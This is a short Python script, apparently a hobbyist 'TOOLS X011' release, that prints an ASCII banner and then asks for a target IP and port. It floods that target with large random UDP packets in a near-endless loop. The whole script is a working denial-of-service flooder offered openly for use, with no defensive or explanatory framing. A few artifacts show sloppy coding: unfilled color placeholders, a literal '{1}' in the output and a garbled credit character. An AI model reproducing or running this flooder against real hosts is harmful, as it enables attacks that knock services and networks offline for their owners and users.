import os
os.system('clear')
from time import sleep
x011 = """

  \    /     11 1   11 1
   \  /     1 1 1  1 1 1
    \/        1 1    1 1
    /\        1 1    1 1
   /  \       1 1    1 1
  /    \      1 1    1 1
        {Wh}TOOLS  X011 V.1.1 {Ye}  {Wh}CREDIT � HUNXBYTS                    
"""
for char in x011:
  print(char,end="")
  sleep(.04)

import socket, random, time
s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
ip=input("Enter Target IP: ")
port = int(input ("Enter Target Port: "))
s.connect((ip, port))
for i in range(1, 100**1000):

        s.send(random._urandom(60)*1000)
        print("Send: {1}")
